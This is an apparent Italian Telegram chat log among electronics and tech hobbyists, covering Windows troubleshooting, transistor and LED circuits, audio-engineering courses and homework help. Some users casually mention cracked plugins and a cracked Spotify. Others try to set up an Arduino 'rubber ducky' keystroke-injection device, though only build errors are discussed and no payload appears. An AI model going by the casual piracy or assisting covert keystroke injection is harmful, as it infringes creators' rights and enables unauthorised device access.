Normali...non so dirti
Non spiccano
Vero è identica
+99
È un lancia fumogeni al 99% xD
ehm... è normale che non mi si apra più il task manager? 
No (?)
mi sa che una bella scansione completa di Kaspersky non gliela toglie nessuno 
gente, ho un transistor npn, precisamente il 2n2222a con scocca metallica, credo che sia lui il problema di tutto il circuito, ditemi se mi sbaglio, controllando con il multimetro mi esce che tra collettore - base c'è sempre la stessa resistenza in entrambe le direzioni e, ogni cosa provi a fare, emettitore non da segni di vita
raga ma che
non parte più il task manager, premo su Start e non fa nulla
nella barra sotto mancano il simbolo della batteria e quello dello speaker
Spegni e riaccendi, funziona sempre
magari  è già la terza volta che lo faccio
*wannacry intensifies*
no oh
pago Kaspersky per qualcosa
che poi lo disattivo perchè è troppo esoso, ma è un altro discorso 


o sbaglio io forse?
raga mi sto preoccupando seriamente
Formattone u.u
ho terminato Explorer.exe con taskkill per riavviarlo e vedere se si sistemava, ho dato explorer.exe e adesso si carica solo la barra sotto
solo la data, tra l'altro
a sto punto anche, è che non vorrei perdere le cose che ho dentro 
*boots linux*
Up
ah no cazzo, il C: non si può leggere
+8343473464676767
Ma si che si può leggere
Bravo, almeno non perdi tutti i progetti
non se hai abilitato il fast boot da Windows 
SPERO
E tutte le crack dei plugins 
io boh
cazzo è vero 
NEXSUUUUUSSSS 
SYLENTH1
In readonly sì
ehm... come?
Ma hai riavviato?
3 volte
Comunque nemmeno da me non si apre il task manager nei pc dell' uni non so cosa abbiano fatto ma sono disattivate tutte le scorciatoie da tastiera, la ricerca in start e il tasto destro nel desktop
Salva tutto in una chiavetta e formatta
Qualcuno se ne intende di chimica?
Mah, sarà rotta la tastiera probabilmente
ho un hard disk esterno per fortuna, faccio una partizione e clono fisicamente C:
poi prendo i file con calma
Nono xD
:3
ma porca tr*ia, si può?
ah ops 
Cosa importante sapere che è nacl non si sa xD
Windows è per Hacker, sii umile
raga non ci credo
sono un genio
ho aperto notepad da terminale, ho scritto cose a caso, poi vado su Salva con nome e si apre Explorer 
WTF??
bello Windows, fatto bene mi dicono
... e intanto a me non viene l'esercizio...
Comunque la risposta è C
Si... ma a me verrebbe un altro risultato che soddisfa la richiesta
? Tipo quale xD
La risposta ai test è sempre C di di parti basse posteriori
33,43
Ahaahahah ok allora tutto risolto
Ragionamento? Vedi il mio fila di più
Infatti io che sto pure a pensarci
Ma davvero la risposta esatta è C? XD
Dai se mi dici il ragionamento vediamo cosa è sbagliato
Si ahahhaha 
Ah ok, allora vedi che sapevi la risposta esatta, a cosa serviva chiedere
Si ma non capivo il perche
Te lo ho detto, dimmi cosa hai fatto , ti dico cosa hai sbagliato
Ecco...
Ahahha ma non ci ho capito nulla
Va beh hai 120g di quella soluzione al 15% in peso in sale.
Quindi hai 18g di sale e 102g di acqua.
Data una soluzione al 30% in peso  puoi dire che 0.3= grammi sale/ (grammi sale più grammi acqua) 
Hai i grammi di acqua....
Non ci va 120 ma 102
Cavoli hai ragioneeeee
Grazie mille!!!!
E comunque nel dubbio la C 
Sempre
Come sta andando??
Ahahahahah quante volte 
Gia successo a scuola da noi dopo un po' non è partito piu windows 
E poi non ti fa fare nulla perché si richiude subito? XD
Ahahaha con quella m*rda di 8.1 sarà successo più di 3 volte 
Ho pagato una resistenza da 1k 0,50€ l muert su
Ok
Traduci
Su Amazon avrei pagato un pacco intero con varie resistenza 10€
Ti conveniva
Però +5 di spedizione
È come aver pagato una bottiglia di birra 10€
Vabbè, ormai è fatta
Ehhh
Mi aspettavo dicesse 0,05€
E invece..
E come fa a mangiare poi?
Che una resistenza è 
r.i.p
Ma chi glielo fa fare di tenere quelle cose se poi deve venderle a 1centesimo.... Ci deve guadagnare tanto 
Ho capito, ma 0,50 l muert sue
Prossimo volta bangood
sono cose diverse, e poi non te ne inviano 1 XD, sulle minuterie in Italia c'è un rincaro grande, pensa anche alle viti
fatto fatto, thanks  più o meno...
sembra bene dai... ora sto eliminando file inutili, deframmento il disco e poi lancio una bella scanzione completah
(il tutto ancora con il CMD e Notepad aperti sotto )
Ti consiglio una di quelle rescue usb con un buon av dentro
Ahahahahahha
yup, ho già creato quella di Kaspersky, si sa mai
Omfgwtf
Puoi ben capire che formattare per me è un bel problwma
Aiuto
Troppi
Totale 90gb
eh più o meno sono messo così anch'io 
tutti craccati, ovvio 
Raga, l'elaborazione fotografica è la morte
1 foto = 80gb di file
com'è che sei così appassionato e non sei ancora nel gruppo producer? 🤔
Troppo tempo libero
Eh bho
dammi un po' di tempo libero, plis
Non lo conoscevo manco 
Ho anche fatto corsi da fonico
Le basi del suono
non spammo neanche, lo trovi cercando la prima cosa che ti viene in mente 
uuuh 
uni?
Ad esempio mi hanno inseganto a calcolare i comb filter , i cablaggi dei mixer da palco
Mi manca quel posto
OwO
Adpe
Aspe
Preparati
Una foto un po datata di dove ho fatto lezione
coooooooooooooooooooooooooooos
dimmi città paese indirizzo nome telefono nome della mamma e del papà e del fratello e della zia
Foggia
mm
Prossimo corso a maggio
vaboh, probabilmente so cosa fare dopo le superiori, al 98%
Fiondarti la
ecco 

Si usa anche in Trentino?🤔 cioè io lo uso
Hanno pure la sala registrazioni
eeeoeoooeoeoooo
Si usa in tutto il nord ( io son lombardo ma sono stato cresciuto a pane e Veneto) ahahah
Corsi completi 
orco
•L’apparato uditivo umano
•Acustica:
1) Le onde sonore
2) Le frequenze fondamentali e le armoniche
3) Le interazioni
4) I risonatori
5) Il timbro
•Psicoacustica:
1) L’approccio psicologico all’ascolto.
2) L’audiogramma medio
3) L’effetto di mascheramento e altre anomalìe
4) La percezione soggettiva
5) La percezione dello spazio
•La voce umana: analisi e sintesi
•I microfoni: tipologie, utilizzi. Tecniche microfoniche
•I pick-up: strutture e funzionamenti.
•La fase
•Il fonometro
•I cavi audio: schemi e connessioni
•Storia delle tecniche di registrazione / le Daw
•La distorsione: overdrive, a diodi, a valvole
•Il mondo analogico e il mondo digitale: pro e contro
•Il campionamento e la conversione
•La manipolazione creativa dei suoni / gli effetti:
1) Il riverbero e l’early reflection
2) Il delay
3) Il chorus
4) Il flanger/phaser
5) L’equalizzatore (parametrico e grafico)
6) L’analizzatore di spettro
7) Il compressore
8) Il de-esser e il ducker
•Come ottimizzare un impianto P.A.: misurazioni e ascolto
•Gli adempimenti previdenziali e assicurativi dei tecnici
•Le applicazioni:
1) Dal vivo: configurazioni per il "suono" desiderato
2) In Studio: panoramica sulle fasi della registrazione
3) Il banco di mixaggio (analogico e digitale) e gli effetti "particolari"
4) I trucchi. Le elaborazioni per il mix finale
•Il mastering: perché è necessario. Nozioni e dimostrazioni
•I microfoni e le tecniche microfoniche.
•Tecniche di registrazione (analogiche e digitali).
•Il mixer, configurazione tipo (Studio / Live).
•Il concetto di matrice.
•Cablaggi (alimentazione e audio). Nozioni, misure e assemblaggi.
•Outboards: tipologie e differenze qualitative. Ascolti critici ed analisi.
•Approccio creativo.
•Il monitoraggio neutro: necessità o limite? Ascolti critici ed analisi.
•Panoramica sul MIDI.
•Le scelte di una produzione.
•Architettura di una D.A.W. e programmazione
•Ripresa e registrazione di strumenti (con musicisti):
    1) La batteria acustica ed elettronica.
    2) Il basso elettrico, il contrabbasso, il violoncello.
    3) Le chitarre (acustiche ed elettriche).
    4) Tastiere, synt, pianoforte acustico.
    5) I fiati.
    6) Voce maschile e femminile.
    7) Psicologia della registrazione.
    8) Il surround
•Editing ("no noise", creativo, correttivo).
•Il mix (pianificato, istintivo, "no mask") - analogico e digitale
•Il mastering. Perchè esiste. Simulazioni.
•Il sound ed il territorio (British, American, Italian, Japanese).
•Live:
    1) Il P.A. e le sue difficoltà
    2) Stageplan e channel list
    3) Riprese e configurazioni live
    4) Alcuni impianti P.A. (line array, point source, constant curvature, steerable, etc.)
    5) Il palco: matrice, monitor e ruoli nell'esibizione
    6) L'interazione tra palco e P.A.
    7) Le unità di ritardo
    8) Il cross-over elettronico / l'equalizzazione ambientale
    9) Psicologia del palco e della sala
    10) Virtual sound-check efficace, FOH e Stage
•Post-Produzione con gli allievi e verifica con i musicisti
•Test Finali.
massì ma vai tranquillo, spegni il pc, riprova domani, vedrai che andrà
ho finito le esclamazioni
è fantastico
Orari del Corso:   dalle ore 10:00 alle ore 21:00
piccolo prezzo da pagare
Essendo anche pendolare per sto corso
un suicidio ma è fantastico
Io sono arrivato agli adempimenti previdenziali e assicurativi dei tecnici
Prossima sessione finisco il corso
uu buona fortuna 
Grazie 
Perché mi da questo errore secondo voi? Ho messo l'include...
Non vorrei dire una cavolata, ma le librerie in c non sono tutte solitamente scritte in minuscolo?
non per forza
Hai scaricato la libreria?
La board selezionata é quella giusta?
Si
Arduino Mini
Ho provato anche con pro e pro mini, ma l'errore è sempre quello
quella libreria è compatibile solo con l'arduino promicro mi sa, e le rubber..
Ho proprio quella del video di marco
La felicità di un piromane in una foto :D 
 prendi esempio..altro che scatoletta dei potenziometri! questo si che è avere coraggio!!
Ah ecco mi sembrava
ma cosa cazzo ha Windows contro di me stasera?
cioè proprio non posso lavorare, eh? 
madonna tutte a me succedono
Salve, sono nuovo su telegram, potreste dirmi se il mio numero di cellulare compare nel mio profilo? Grazie
Povero.
No, non compare, solo chi lo ha lo vede.
Thanks
Nessun problema. :p
sto seriamente riconsiderando di passare a Linux come sistema principale

(spoiler: non lo farò perchè la suite Adobe, FL Studio e tante altre cose mi fanno sempre cambiare idea)
sei gynx?
La suite crashdobe casomai
mai crashata una volta, sul mio
e ho un pentium 🤷‍♂
idem
Con adobe freezedroom, crasher effects e dumptoshop
qualcuno di voi sà usare photoshop?
Minchia io ho un phenom II e non lo apro neanche
Circa
mi sto ritagliando la faccia ma l'orecchio l'ho selezionato malissimo, vorrei rimediare
non riesco manco a posizionare un elemento al centro di una foto, vedi tu 
Maschera o gomma?
come faccio?
Domanda di HTML: sto sviluppando un sito (e gestendo molti account mi appoggio a Wordpress) però ho inserito un ancore nella pagina, il problema è che quando lo utilizzo non si vede la parte iniziale perché viene coperta dal menù del sito. Qualcuno sa come risolvere?
🤔dual boot?
quello ce l'ho già, pensavo di usare più Linux che Windows
però non posso ._.
i videogggiuuchi
Adobe fa quest'effetto purtroppo..e se inizi ad usare AutoCad e CorelDraw è finita
é da 4 mesi che non apro un videogioco che sia su pc, wii o qualunque altra cosa .-.
wine?
tu, COSA SEI
ma ma ma, pensa a FFXV
Dualboot amiko
Un attimo, hai cancellato con la gomma o creato una maschera? In ogni caso control z è tuo amico
ho 386 cose da fare :(
gomma

Io prima di portal non vedevo un gioco dal 2016
pare che si veda bene
FL va da schifo, Adobe pure, e poi non è solo per quello
qui 
 va d'accordo con me: Windows ha moltissimi lati positivi, come l'ottimizzazione (guarda come finisco su ignuranza)
vabb, ma tu sei tu, io nel tempo libero gioco a mmorpg del 1999 ma così belli che mi appassionano tantissimo, da quando avevo 6 anni che ci gioco...
Se c'è uno strumento aggiungi/sottrai allora imposta aggiungi, altrimenti ctrl z
Wine è quello di cui hai bisogno per vederli andare bene su linux:
Apri il programma, avvii fl studio e ci vai giù di Wine finché non sarai abbastanza sbronzo da non capire un cazzo
Aaah quel wine  eeh sì, fa funzionare tutto ogni volta
sul Pentium di Filippo CorelDraw non ci gira neanche se scendono San Filippo e Gesù con tutta la croce appresso
ma hahahahahahah
qualche studiato che ora che è sera entra su telegram?
✋
ah su quello  nope
H1z1 free to play top

N-no, perché?
 te che ne dici?
🤔mai usati..hai guardato il datasheet?
si, dato un'occhiata, (in realtà non ci capisco nulla) ma mi sembra di aver capito che in una direzione dovrebbe essere minima e dall'altra di 60kohm la resistenza quindi....però boh, non sono sicuro di aver capito bene
🤔ma il circuito di amplificazione l'hai dimensionato bene?
in che senso?
tra l'altro, come li testo i condensatori?
Aaaahhhh 
Si è arruolato nell'isis?
Verissimo
Ha senso utilizzare il miglior sistema per ogni operazione che sia programmare o giocare o utilizzare software ottimizzato
LOL
 servi
dal gruppo producers è partita la RussoChallenge
oo maa god
che caxxo è stammerda, ora ve le tiro io le robbe belle qua

non insultarmelo, che è pure famoso lui
dentro quel gruppo abbiamo già un paio di tizi con tanto di etichette del calibro di Hexagon e Spinnin 
(forse Spinnin', non vorrei sbagliarmi 🤔)
haha, ora te le butto io le trashate ucraine qua, altro che
tu povero mortale non puoi concepire cosa siano le trashate ucraine

hey, hey, ti dico solo una cosa, cerca "Время и Стекло" su youtube, e vedi
e poi parlano del trap in italia, ppfff, li sono avanti...troppo...purtroppo

forse te non te ne accorgerai ma tutte le parole hanno l'accento sbagliato per far risuonare la rima che non esiste🤦‍♂️
macche
Quanto odio saldare con il pirografo
Secondo voi ha senso passare a un saldatore cinese da 15€?
No, spendici qualcosa in più
Come faccio a capire quale scegliere?
Cosa guardo? Potenza? E poi?
Dipende che devi saldare
Ah dipende
Cosa cambia?
E camper down
60€ di filtro e 140 di manodopera
Ho saputo il verdetto
Caruccio
La temperatura che deve raggiungere, il tipo di punta ecc...
Allora devi selezionare Arduino Leonardo come board

wtf?
WTFF
lineage os su rapi?
videoooooo
Assolutamente
Non domani però
ook
vabbè... vado a letto
buonanotte
vai a nanna android studio
I'm in love
Un sorso non guasta mai
Sera ragazzi
Non è il migliore che abbia mai assaggiato, i miei zii hanno sempre nettare sudamericano migliore... Però è molto buono ed è rum 
Sera dottore
Cerchi di affogare i tuoi pensieri nel rum oggi?
Nono mi deve durare qualche mese almeno con quello che costa
Ahahahah
Però è arrivato oggi da amazon e dovevo inaugurarlo
Ma te non eri ricco?
Mi sembra giusto dai
Si, moralmente 
No poi devo risparmiare abbestia per un mega progetto autunnale che non è certo però se andasse in porto gioireste tutti e 27.839
Escilo
Il progetto, non fraintendere
Non posso spoilerare niente 🤐...
...ma in realtà l'ho già spoilerato un mesetto fa anche se in pochi ve ne siete accorti
Devo far partire la modalità stalker o me lo risparmi? 
Sono qua a sniffare il bicchiere che sa da tabacco e vaniglia 🥃
Muuuuto sto
Ha già fatto effetto il rum?

Eh vabbè
Hahaha dovrei bermene 20€ prima che faccia effetto
Scusate se interrompo un secondo ragazzi, ma voi avete mai sentito parlare di Beacon wifi?
E la casa?
Il metabolismo che mi salva dall'obesità tenendomi sottopeso e mi rimuove l'effetto del caffè fa lo stesso anche con l'alchooohhhlh 
Yup, che costruisci?
Daiii Marco, non ho voglia di leggere tutta la chat, dicci almeno la data o una parola chiave
Mi è stato proposto come utilizzo per esp8266
Ahahahahah
Lo scopo è non spoilerare fino a che non è sicuro... Quindi settembre
 inizia a minare
[spoiler censored]
In modo da riuscire ad andare -27000
Non avresti preso la 1060 AHAHAAH
Sei pazzo?
Infatti non per me 
Vuoi hackerare l'nsa da vero lamer?
No comunque veramente non è questo, anche perché non lo pago io
Ahhh
[spoiler censored]

Basta rum.....
E anche perché dovrebbe succedere in primavera
Ahhahaah
E chi? Bangood? Sei diventato così importante per loro?
[spoiler censored]
Wtf?!
Ho capito!
Volete costruire un computer abbastanza potente da fare un attacco dos o DDoS contro i mates 
Ecco, ho eliminato i tre messaggi spoiler perché non so se sono autorizzato a spoilerare
Hahahahhaha
Il tuo segreto è al sicuro 🤫
Però non sarebbe male eh
Il progetto per settembre/ottobre invece è più costoso, più rischioso e sarebbe ancora (infinitamente) più apprezzato da voi
Okay ora son molto più felice. Posso dormire tranquillo
Grazie
Per quello devo ponderarlo bene 🤔
Ah ma non era quello? 
Basta alcolici da Amazon
Ma l'ho detto... Ho iniziato la frase con "e non è" hahaha
L'altra sera stavi parlando di prendere casa
🤔
L'hai detto tu
Pensavo fosse ironia...
Boh comunque prima che tiriate fuori ogni cosa che io ho detto nell'ultimo mese...
^
☺️
 appassionato di sicurezza?

 ho scoperto il tuo piano
Eh?
Poi ho detto che questo accrocco di youtubers è in primavera e non a settembre... E che non lo pago io 
 vuoi comprare questo!
È in soggiorno, è visibile a tutti
Difficile nasconderlo, è a coda
AHAHAHA
Ahahahah
Però è di mio fratello, io suono il sax 
Ho visto che fai parte del gruppo inforge e di parrot
Io...... Niente.....non suono un cazzo
Però adesso che ci penso io LE SUONO
Hahaha questa è l'apoteosi del "we fía bisogna faturaare"
Perché faccio karate 
"Sono dentro"

Ahahahahah
Anche in quello italiano
  ma te hai le camere di sicurezza Xiaomi visto che sei tanto fan?
Si ma non seguo
Vabbè, non ti perdi molto, tranne per la settimana scorsa
?
Era iniziata una conversazione interessante sull'analisi forense
Ah figo figo
Nup perché le abbiamo messe su potenti
Erano quelle dell'aeroporto di Bolzano, le buttavano via 
Sono dei fucking computer con gestore di pacchetti, server e cosevarie... ciascuna

Notte ragazzi
Notte
Io devo editare il video di domani entro stanotte

Che dedizione alla passione! :o
Ah grazie mille, proverò

Quello Havana è più buono ☺️
(e costa meno, se lo prendi direttamente a Cuba )
il fatto è che è lentissimo
ci sono giusto qui 9000km 
Hobbyking si droga
Eh 
ottimo
Io 3.11, ho vinto 
quando ti rendi conto che spotify ha molte classi

buongiorno ragazzi ho comprato un drone cinese e ho visto che anche se nom toccavo il controller il drone andava avanti lui da solo che problema puó essere. Mi affido a voi!
Maaaaaaaa
Quindi quanto ci vuole ancora prima di riaverlo free??
penso che ci sia qualcosa da calibrare, prova a cercare qialcosa sull'internet
Anche Armada
Ma in realtà 3.30
chi? 🤔
AMG non lo sento da 3 settimane, tra l'altro
Idem
L'ultimo accesso è sempre anteriore
Samuele
video non disp
Ohshit
Ordine e pazzia
che èsuccesso?
Boh
Ma prima c'era, credo.. Quindi c'è qualquadra che non cosa
 Come avete creato la preview? Oppure lo fa in automatico?
Quella preview è fatta in automatico, adesso stiamo lavorando sulle AMP
lo hanno rimosso da youtube?
Buon suicidio
quella che vedi col tasto "Visualizzazione rapida" insomma
Eh potrebbe essere
don't know... bisogna aspettare Marchetto
Che in automatico 
di già? ⭕️
taaanto... e di certo non sarò io
eh ma ci hai tirato giù qualche calendario
Ci sono dei tag da inserire in una pagina html, tipo og:title, og:description ecc
ci mettiamo 3 minuti a riaprire un nuovo canale 
Un paio, la metà di amp 
Ma dovrebbe apparire un disclaimer, no?
Oddio, nel video? Perché del blog Youtube non se ne frega
Stavo installando Parrot e si è bloccato così
Bho aspettiamo Marco 
Riprova 
Si nel video
Si ma come esco da qua? 
Vorrebbe dire esportarlo tutto di nuovo... Boh sentiamo marco
spegni tutto
Lo spengo malissimo?
il classico: "Questo video è stato eliminato per violazione etc etc.
"
Stacco?
si sì
Yup... O se vuoi prova con ctrl alt canc
Oke
Nope, mi sono espresso male. Mi spiego: se il tubo avesse eliminato il video allora presumibilmente dovrebbe esserci il messaggio di violazione e non "questo video non è disponibile"
Aaah ok capito
SEEEEEEEEEEEEEEEEEEEEEE
Boh probabilmente solo qualche casino.. Dopo mangiato controllo (la pappa prima di tutto)
NOOOOOOOOOOOOOOOO
 Giusto
giusto
Perché Windows... Perché.
Ahahahhahaha
?????????????? 
Cosa dovrei fare? 🤔
Rifai il cd
Forse ho capito
Ho collegato la chiavetta tramite una HUB USB, ora provo direttamente al pc
E poi io lo sto installando da USB
Ah 

Orange pi >
Hai dormito? :p
 ma domotica?
Rock64 >>>
Sì ma capitano tutte a me oh
si è rotta la termocoppia della caldaia mentre mi lavavo, ergo dopo 2 secondi che parte va in blocco
why quell'apostrofo nel nome?
storia lunga
il problema è un'altro
"last seen yesterday", io sono online ora.
ma
cos'è successo?
qualcuno che si diverte con i furti d'identità
ma chissene frega, tanto voi sapete qual'è quello vero
Non riesco ad avere un'ora per registrarla 
Settimana prossima
comunque tra due settimane esce un altro aggiornamento importante di Switchando (la prossima settimana sarò a Torino, questa settimana ho lavorato per un server di Minecraft)
che verrà seguito dal rilascio della documentazione delle API
però tranqullo la procedura d'installazione/aggiornamento resterà la stessa
Se si blocca il contatto, c'è possibilità che lo limitino?
?
No
no ma
perché dovresti? ahahahah
Per farti recuperare l'username immagino
tanto volevo cambiarlo
Ma è furto d'identità
solo che 
 non sono l'unico ad averlo, PhantEx (quello vecchio) mi fa ricordare troppe cose brutte, avevo messo quello username per non farmi rintracciare con quello ancora più vecchio, Fantasy2001
Hai risolto?
Come lo usi?
Alcolista
Fai una rubrica su come liberarsi del alcool
Rubrica telefonica?
No una rubrica, tipo una serie, come vuoi chiamarla tu :O
Poi se ci fornisce anche la rubrica telefonica degli alcolisti anonimi 
Ho da poco installato la fibra (30/30) e ora lo script su RPI per monitorare la velocità internet invece che segnale 30 segna 1,ecc. Qualcuno sa come risolvere?
Io ne ho 8088 cose da fare
Dopo la pizza ci scassiamo di Ron agricolo
io devo far partire apache... ne ho 80
ip mio messaggio
chi l'ha tolto?
ehm... nessuno (?)
si era buggato telegram
noh, rispondeteee
Scusa ma ieri da Torino sono dovuto andare a Pavia, Parma, Ravenna, non ho seguito la chat
Con che cosa lo misuri? Tester analogico o digitale?
E soprattutto, quali sono le tensioni?
Le tensioni non sono rilevanti del tester, piuttosto
Il transistor è saldato o su breadboard?
Non è stata un granché la fiera di Montichiari
Andrebbe scollegato per misurarlo,
Eri a Montichiari? Volevo venire
Perché me la rileva a tratti ?
sisi, su bradboard, per misurarlo lo stacco e misuro sui piedini, per misurarlo l'ho misurato giusto, sono sicuro, però non è che dia risultati granchè rassicuranti
Se usi tester digitale non salire oltre i 20kohm
Brad?
Con il rosso sulla base devi avere conduzione si collettore ed emettitore. Con nero sulla base non conduce mai
Translate plz
Google traduttore
Ma io non ho mai visto un video cinese in vita mia
Questo è il fatto disturbante
Ahahaha
Wait a sec
High IQ? Questo compagno di classe di nome Xueba! feat.啾啾 Scarpe
Mmh 🤨
Asp6
non giudicarmi, ho 99 cose tra le mie mani e la tastiera, devo pulire sta scrivania
da me con sia rosso che nero su base conduce su collettore, per l'emettitore invece da sempre e comunque 1. che vuol dire che non è proprio connesso tipo
Pensavo d'averlo scritto io dopo una caraffa di vino
e base-collettore si sta sui 10kohm da entrambe le parti
Hai il cicalino? Suona tra B-E invertendo i puntali?
Io infatti ho fatto tradizionale
non suona no
Devi provare il semplificato
 consigli sul come riconoscere il cinese tradizionale e quello semplificato? 
Il mandarino è diverso?
Prova prima l'uno e poi l'altro su translate
Quello che dà il miglior risultato
Ni hao
Su Google translate non c'è il semplificato
Come no
Nope
 potrei parlarti in privato?
Ma certo
Ciao a tutti stavo provando cn arduino il rubber ducky ma mi da un errore nella libreria keyboard qualvuno sa perche?
Da quanto sono complicati gli idiogrammi
In linea di massima 
Comunque quando cominci ad imparare il significato di ogni ideogramma e difficile confonderlo con altri
Si
Il vero problema è quando cominci 
Buongiorno, ho fatto un display a 7 segmenti con delle coppie di led rossi. Però non riesco a calcolare la resistenza da mettere, anche perché non so che tipo di led sono.
Hanno catodo comune
Qualcuno mi sa aiutare?
Li hai messi in serie i 2 della coppia?
Parallelo
A che tensione li alimenti?
Era meglio in serie
Usa 7 resistenze sui 7 anodi
 ciao, scusa se ti disturbo.....tu hai uno zaino tattico stile militare vero? Potresti mandarmi il link o qualche foto? Come ti trovi?
ma seriamente
AHAHHHAA HA
Il leonardosalviati di Discord
Mi sono accorto tardi di non averla messa, pensavo che metterne una per coppia bastasse...
5v comunque

io boh 
Una per coppia basta, hai 7 copie prova 
 ohm
Però non hanno la stessa intensità
Con cosa li piloti?

Per il momento con un alimentatore variabile
Poi li piloteró con SN74LS47N
Quindi non si siede l'alimentatore
Non ho capito
Metti una pellicola rossa davanti, aiuta
In parallelo hanno piccole differenze di tensione di giunzione e cambia la luce emessa
Metti quel 2 in serie, aumenta la resistenza, se migliora modifichi anche gli altri
In serie la corrente è identica e la luce uguale
E riduci anche la corrente sull' integrato
Provo a vedere se riesco a metterli in serie, grazie mille
Prova con la coppia che stavi testando prima
Soluzione : non mettere resistenze :D
come stampa è buona secondo voi?
Perspicace
Ma Non Credo che possa funzionare
Apparte ai filamenti ritirati male in alto a destra, tutto bene
Spotify di nuovo craccato
Qualcuno sa come risolvere? La libreria l'ho inclusa
Servirebbero troppi avvocati 
quelli con le forbici li ho cavati
Anche se lo meritano
Come un Arduino
Cos?
Quando vai a messa e al posto di cantare con il coro stai solo ad ascoltare... ma sei un producer e ti viene l'ispirazione per una nuova soong 
 almeno tu, capiscimi
A me viene l'ispirazione anche col rumore della tavoletta del cesso, fatti due conti tu
NO NON ADESSO PLIS
ma hahahhaha stai messo peggio allora
grazie gesù
Ok sono stato troppo cattivo
Cho sa dirmi se questo dispositivo si puo usare come rubber ducky?
Yup se non mi sbaglio
in questo video usa proprio loro
Allora, ho cambiato tutto ed ho messo in serie... La resistenza di quanto la metto?
Ora funziona se ne metto solo una
Sapete perchè mi da questo errore caricando lo sketch sulla scheda che marco ha usato nel video della rubber ducky? avrdude: butterfly_recv(): programmer is not responding
avrdude: error: programmer did not respond to command: exit bootloader
Si, utilizzerai delle librerie diverse
bootloader / programmatore sbagliato
Io vorrei produrre qualche remix delle canzoni che suonano in chiesa ma la blasfemia potrebbe essere troppa 
ma chi sapeva che blackgeek fosse iscritto a overvolt hahaha? Ecco dove ha imparato hacking

470 ohm

ma 
Ave o maria hardbass version?
Mhm non ne ho... Se ne metto da 330 va bene?
Non hai mai chiesto collaborazioni?

working on it 
Si
HEY, HEY, alla fine ho preso un transistor a casissimo npn che ho trovato da mia nonna oggi, ce l'ho ficcato, 
 yeeeeeeee
Here, probabilmente si sente meno perchè 1)la cassa è troppo piccola e 2)avrò sbagliato qualcosa con le resistenze
tra l'altro, in caso, io ho messo prima una resistenza di 100k su condensatore e base e dall'altra parte collettore e secondo_resistore e il secondo resistore che è connesso al primo e al collettore è dall'altra parte connesso al positivo dei 15v in entrata è da 10k, quindi...100k in ingresso segnale e 10k in corrente in ingresso, dite che ci sta o devo cambiarle?
tipo ora è così, e sembra essere controproducente, abbassando il volume(forse è solo per la cassa) e entrambi i condensatori sono dei ceramici 103, da 10nF o 0.01uF, come preferite dirlo
il transistor npn è un bc547, 
, ma pur sempre un bc547
ciao, ma voi riuscite  connetervi ad 
?
yephhh
ok, ora sono riuscito ad aprire la pagina, prima è crashata 2 volte
Che triste
(A parte il fatto che ste teste di merda manco hanno messo in BCC gli indirizzi mail a cui hanno spammato...)

Che schifo, altro che tristezza
Ma aprire ste liste per fregare qualche decina di persone per il profitto personale...
Una volta una mail accademica arrivò senza bcc... Tipo 5000 indirizzi email... E la gente iniziò a rispondere con rispondi a tutti
Si ecco
Hanno fatto lo stesso con l'auditel un paio di anni fa hahahaha... Un giro da miliardi di euro ribaltato in un attimo, hanno dovuto rifare tutto 
Ehi russo(why?)
Sì ma ti immagini ricevi una email con tutte le email degli studenti e processori e del rettore della tua università e la gente rispondeva a tutti con "io non sono interessato"
ah niente, l'hanno mandata in un gruppo 
Ah 
Eh... Fastidioso ma non muove milioni di euro ogni mese 
Ahaha menomale
Virus



by 
 yee, e niente libri da 99999999 pagine per riuscirci, uau, solo componentistica degli anni '40 avvolta dalla magggia :DDD
bella, ora ne faccio uno così e lo porto a scuola
Nooo e io che speravo di sentire la voce di Giulian
Se cacciavi un urlo alla fine eri un genio, ho fatto tutto il video col volume al massimo 

hey, per chi mi hai preso, comunque, qualcuno che molto sinteticamente mi citi con quale logica dovrei lavorare se volessi aumentare ancor più l'amplificazione?
Ahahahaahah
Ora va, grazie mille
ma hahahahaahhaha
un amplificatore a transistor classe a
Miii come capisce perfetto sto bot 
no...non sarebbe comodo affatto, soprattutto per il mio portafogli
infatti... e anche se sbaglia qualche parola, è utile per tenere il filo del dizzcorso
anche perchè se lo vuoi sapere già la scheda bluetooth che stavo usando ha un preamplificatore integrato
che io ascolterò 1 audio ogni 50, qui 
vediamo se capisce anche il vicentino, per me escono solo che asterischi nel messaggio
naah
e comunque questo amplificatore non è stato studiato per l'audio..almeno, all'inizio era per quello, ora credo che ci attaccherò un potenziometro e lo userò nel progetto da portare al tandem all'esame, pensavamo di fare un oscilloscopio da poveri con un crt e l'nxp, più questo circuitino di amplificazione d'onda e poi fotoresistori e quant'altro per altre cosuccie a cui penseremo ancora
 ci sei?
sarà in giro a sistemare qualcosa 

Mi serviva un consiglio
Ciao, ma cosa si può programmare in assembly?
Assembly è un linguaggio di bassissimo livello se non hai mai avuto esperienze di programmazione ti consiglio di partire da un linguaggio più alto
Ti sconsiglio di farlo in primis
È MOLTO difficile
Perché il rapporto tra istruzione codice macchina e istruzione in assembly è di 1
Questo ad esempio 
Wow
Quindi pure sistemi operativi?
Comunque sì è abbastanza complesso, richiede conoscenze generali di come funziona un processore e conoscenze specifiche dell'architettura che vuoi trattare
In parte sì
Quindi "cambia" per ogni architettura?
apposto?
Mi si era buggato Telegram, sono uscito e rientrato
Diciamo che gli aspetti base di ogni linguaggio Assembly sono gli stessi, però programmare in Assembly per esempio su MIPS piuttosto che su processori basati su istruzioni CISC cambia abbastanza, soprattutto dovuto al tipo di architettura, la disponibilità di registri per il programmatore, l'approccio del processore eccetera
Un programmatore Assembly che deve programmare su una nuova architettura diciamo che si deve studiare gli aspetti di quella specifica architettura se ha già programmato in passato su delle altre
Ma quindi come linguaggio è utile?
Minchia il MIPS32, lo studiamo ad Architetture
Dipende dalle esigenze, a livello didattico é utile per conoscere a fondo il processore
Anche io 
OK grazie mille :)
Di nulla 
Dovremmo farci delle simulazioni su in teoria
link
Su MIPS?
Già
Nope
why?
Bello bello
io uso un Mil-Tec, ma al momento su Amazon non è disponibile..questo è uguale al mio ma è di un altra marca 

gli esperimenti, quelli belli
ho visto il messaggio, ti ho mandato un link
Qualcuno ha mai usato un 7447 per i display a 7 segmenti?
Si, io :D
Ragazzii urgente bisogno in java
spara
Ho un jar e vorrei modificare una classe
Sono riuscito a decompilarlo e ora lo devo rifare in .jar
Any ideas?
Mica mi puoi dare una mano? Non riesco a controllarlo con Arduino
Volentieri, solo domattina che ora è un pelino tardi
Si certo 
Maaa ok
É entrato anche qua
Eccolo (non Filippo, ovviamente)
Ah fantastico
Ma chi è 
E che ne so?
Poi Gesù Cristo non posso cambiare 
